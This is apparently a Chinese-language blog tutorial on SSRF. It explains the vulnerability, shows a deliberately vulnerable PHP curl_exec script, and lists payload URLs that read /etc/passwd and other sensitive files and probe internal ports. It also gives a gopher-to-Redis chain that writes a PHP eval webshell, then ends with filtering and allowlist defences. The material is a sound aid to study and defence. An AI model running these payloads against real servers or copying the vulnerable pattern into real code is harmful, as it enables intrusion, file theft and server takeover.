---
title: "SSRF 服务端请求伪造"
published: 2026-09-16T22:46:00+08:00
description: "SSRF 的核心概念、内网探测与协议利用方式，以及常见防御思路。"
image: ""
tags:
  - 安全笔记
  - Web安全
category: 技术文章
draft: false
lang: zh-CN
pinned: false
comment: true
---

## 一、SSRF 概述

### 1.1 什么是 SSRF？

**SSRF**（Server-Side Request Forgery，**服务器端请求伪造**）是一种由攻击者构造请求，由**服务端发起请求**的安全漏洞。

### 1.2 核心概念

| 属性     | 说明                                   |
| -------- | -------------------------------------- |
| 攻击方式 | 攻击者构造请求，由服务器代为发送       |
| 攻击目标 | 外网无法直接访问的**内部系统**         |
| 核心原因 | 服务器对目标地址**未做严格过滤与限制** |

### 1.3 数据流

```plain
攻击者 → 构造恶意URL → 服务器接收请求 → 服务器向目标地址发起请求 → 返回响应给攻击者
```

**示例：**

```bash
# 正常功能：获取远程图片
http://www.test01.com/file.php?url=http://file.com/image.jpg

# SSRF攻击：读取本地文件
http://www.test01.com/file.php?url=file:///etc/passwd

# SSRF攻击：探测内网
http://www.test01.com/file.php?url=http://192.168.1.1/admin
```

### 1.4 通俗理解

```plain
A网站 = 外网可访问的网站
B网站 = 内部OA系统（外网无法访问）

普通用户：只能访问A，不能访问B

SSRF利用：通过A网站作为跳板 → 访问B网站 → 攻击内网系统
```

------

## 二、SSRF 原理

### 2.1 形成原因

1. 服务端提供了**从其他服务器获取数据**的功能（如加载图片、获取网页内容）
2. 服务端对用户提供的 URL **没有做严格的过滤与限制**
3. 攻击者可以传入任意地址，让服务端发起请求并返回结果

### 2.2 漏洞产生点

```plain
http://www.test.com/xxx.php?image=/1.png
                                   ↑
                            此处未做过滤
```

攻击者可以修改 `image` 参数为内网地址：

```plain
http://www.test.com/xxx.php?image=http://192.168.1.1/admin
http://www.test.com/xxx.php?image=file:///etc/passwd
```

### 2.3 常见攻击方式

| 攻击方式              | 说明                                             |
| --------------------- | ------------------------------------------------ |
| **端口扫描**          | 对外网、内网、本地进行端口扫描，获取服务 Banner  |
| **攻击内网应用**      | 攻击运行在内网或本地的应用程序                   |
| **内网资产识别**      | 对内网 Web 应用进行指纹识别                      |
| **攻击内网 Web 应用** | 利用 HTTP GET 请求的攻击（如 Struts2、SQL 注入） |
| **读取本地文件**      | 利用 file:// 协议读取敏感文件                    |

------

## 三、SSRF 涉及的协议

### 3.1 主要协议

| 协议        | 说明                                  | 示例                         |
| ----------- | ------------------------------------- | ---------------------------- |
| `http://`   | HTTP 请求                             | 探测内网 Web 服务            |
| `https://`  | HTTPS 请求                            | 同上                         |
| `file://`   | 读取本地文件                          | `file:///etc/passwd`         |
| `dict://`   | 字典协议，探测端口/服务               | `dict://127.0.0.1:6379/info` |
| `gopher://` | 功能最强的协议，可构造任意 TCP 数据包 | 攻击 Redis、MySQL 等         |

### 3.2 curl 协议支持

```bash
# curl 支持的协议
dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, pop3, pop3s, rtsp, scp, sftp, smtp, smtps, telnet
```

### 3.3 curl 常用命令

```bash
# 发送 HTTP 请求
curl http://www.baidu.com

# -v：显示详细操作信息（含请求头和响应头）
curl -v http://www.baidu.com

# -k：忽略 HTTPS 证书验证
curl -k https://self-signed.badssl.com

# -O：下载文件
curl -O http://example.com/file.zip

# file:// 协议读文件
curl -v file:///etc/passwd

# dict:// 协议探测
curl -v "dict://127.0.0.1:6379/info"

# gopher:// 协议（功能最强）
curl -v "gopher://127.0.0.1:6379/_info"
```

------

## 四、内网 IP 范围

| 类别    | IP 范围                       |
| ------- | ----------------------------- |
| **A类** | 10.0.0.0 ~ 10.255.255.255     |
| **B类** | 172.16.0.0 ~ 172.31.255.255   |
| **C类** | 192.168.0.0 ~ 192.168.255.255 |

| 特殊地址      | 说明                      |
| ------------- | ------------------------- |
| 192.168.x.0   | 网络地址，不可用          |
| 192.168.x.1   | 第一个可用 IP，通常是网关 |
| 192.168.x.255 | 广播地址                  |
| 127.0.0.1     | 本机地址（localhost）     |

------

## 五、SSRF 利用步骤

### 5.1 总体流程

```plain
1. 利用 http:// 协议扫描内网 IP 和端口
2. 利用 file:// 协议读取本地敏感文件
3. 利用 dict/gopher 协议攻击探测到的内网服务（如 Redis）
```

### 5.2 常见导致 SSRF 的 PHP 函数

| 函数                  | 说明                                   |
| --------------------- | -------------------------------------- |
| `file_get_contents()` | 读取文件内容，支持 URL                 |
| `fsockopen()`         | 打开网络 Socket 连接                   |
| `curl_exec()`         | 执行 cURL 请求（**最常用、功能最强**） |

### 5.3 漏洞代码示例

```php
<?php
// ssrf.php
$url = isset($_GET['url']) ? $_GET['url'] : "";
if ($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $result = curl_exec($ch);
    curl_close($ch);
}
?>
```

**请求 HTTPS 时绕过证书验证：**

```php
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
```

------

## 六、利用方式详解

### 6.1 利用 http:// 探测端口

```plain
# 探测本地 3306 端口
http://localhost/ssrf/ssrf.php?url=http://127.0.0.1:3306

# 有服务 → 有响应（可判断端口开放）
# 无服务 → 无响应或超时
```

可以配合 **Burp Suite** 对内网进行批量端口扫描。

### 6.2 利用 dict:// 探测服务

```bash
# dict 协议可以探测目标端口的指纹信息
http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:6379

# 如果 Redis 开放，会返回类似：
# +OK
# Unknown subcommand or wrong number of arguments for 'libcurl'
```

### 6.3 利用 file:// 读取敏感文件

```plain
# Windows
http://localhost/ssrf/ssrf.php?url=file://C:/windows/win.ini
http://localhost/ssrf/ssrf.php?url=file://C:/phpstudy/www/config.php

# Linux
http://localhost/ssrf/ssrf.php?url=file:///etc/passwd
http://localhost/ssrf/ssrf.php?url=file:///etc/hosts
http://localhost/ssrf/ssrf.php?url=file:///proc/self/environ
```

### 6.4 利用 gopher:// 攻击 Redis

**gopher 协议特点：**

gopher 是 SSRF 中**功能最强大**的协议，可以构造任意 TCP 数据包，攻击内网的 FTP、Telnet、Redis、Memcache 等。

#### gopher 协议格式

```plain
gopher://<host>:<port>/_后接TCP数据流
```

- 默认端口：70
- GET 请求直接构造
- POST 请求需 URL 编码，换行用 `%0d%0a`

#### gopher 发送 GET 请求

```bash
# 原始请求包
GET /get.php?name=zhangsan HTTP/1.1
Host: 192.168.13.151

# URL 编码后
curl gopher://192.168.13.151:80/_GET%20%2Fget.php%3Fname%3Dzhangsan%20HTTP%2F1.1%0D%0AHost%3A%20192.168.13.151%0D%0A
```

#### gopher 发送 POST 请求

```bash
# 原始 POST 数据包
POST /post.php HTTP/1.1
host:192.168.13.151
Content-Type:application/x-www-form-urlencoded
Content-Length:9

name=lisi

# URL 编码后
curl gopher://192.168.13.151:80/_POST%20%2Fpost.php%20HTTP%2F1.1%0D%0Ahost%3A192.168.13.151%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A9%0D%0A%0D%0Aname%3Dlisi%0D%0A
```

### 6.5 gopher + Redis 写 WebShell

#### 准备工作

**1. 安装 Redis**

```bash
wget https://download.redis.io/releases/redis-5.0.5.tar.gz
tar xzf redis-5.0.5.tar.gz
cd redis-5.0.5
apt install -y make gcc
make
```

**2. 修改 Redis 配置文件**

```bash
protected-mode no   # 关闭保护模式
#bind 127.0.0.1    # 注释掉，允许外部连接
```

**3. 启动 Redis**

```bash
src/redis-server redis.conf
```

#### 生成 Redis 攻击 Payload

**1. 编写 redis.cmd 文件**

```plain
flushall
config set dir /var/www/html
config set dbfilename shell.php
set webshell '<?php eval($_REQUEST[6]);?>'
save
```

**2. 使用 Python 脚本生成 gopher 数据包**

```bash
python redis-over-gopher.py
```

输出类似：

```plain
gopher://127.0.0.1:6379/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c...
```

**3. 再次 URL 编码后发送**

```plain
http://target.com/ssrf.php?url=gopher://127.0.0.1:6379/_%25%32%61...
```

执行后在目标服务器生成 `/var/www/html/shell.php` 木马文件。

------

## 七、SSRF 防御

### 7.1 防御措施

| 措施                | 说明                                                |
| ------------------- | --------------------------------------------------- |
| **1. 过滤返回信息** | 验证远程服务器响应是否符合预期格式                  |
| **2. 统一错误信息** | 避免根据错误信息判断端口状态                        |
| **3. 限制端口**     | 只允许访问常见 HTTP 端口（80、443、8080、8090）     |
| **4. 过滤内网 IP**  | 禁止访问私有 IP 地址段                              |
| **5. 禁用危险协议** | 仅允许 http/https，禁用 file://、gopher://、dict:// |

### 7.2 内网 IP 过滤示例

```php
// 禁止访问内网 IP
function isInternalIP($ip) {
    $internal = array(
        '10.0.0.0/8',
        '172.16.0.0/12',
        '192.168.0.0/16',
        '127.0.0.0/8'
    );
    foreach ($internal as $range) {
        if (ip_in_range($ip, $range)) {
            return true;
        }
    }
    return false;
}
```

### 7.3 白名单方案

```php
// 仅允许访问白名单中的域名
$allowlist = array(
    'img.example.com',
    'api.example.com'
);

$url = parse_url($_GET['url']);
$host = $url['host'];
if (!in_array($host, $allowlist)) {
    die('Invalid URL');
}
```

------

## 📌 快速参考卡片

### 利用方式

```bash
# 端口探测
http://target.com/ssrf.php?url=http://192.168.1.1:22
http://target.com/ssrf.php?url=http://192.168.1.1:80
http://target.com/ssrf.php?url=http://192.168.1.1:6379

# 读取文件
http://target.com/ssrf.php?url=file:///etc/passwd
http://target.com/ssrf.php?url=file://C:/windows/win.ini

# 服务探测 (dict)
http://target.com/ssrf.php?url=dict://127.0.0.1:6379/info

# gopher + Redis 写 shell
http://target.com/ssrf.php?url=gopher://127.0.0.1:6379/_%2a...
```

### 内网 IP 段

| 类别 | 范围                          |
| ---- | ----------------------------- |
| A类  | 10.0.0.0 - 10.255.255.255     |
| B类  | 172.16.0.0 - 172.31.255.255   |
| C类  | 192.168.0.0 - 192.168.255.255 |
| 本地 | 127.0.0.1                     |

### 防御

```plain
1. 白名单限制 URL
2. 禁用 file://、gopher://、dict:// 协议
3. 过滤内网 IP
4. 统一错误信息
5. 限制端口
```
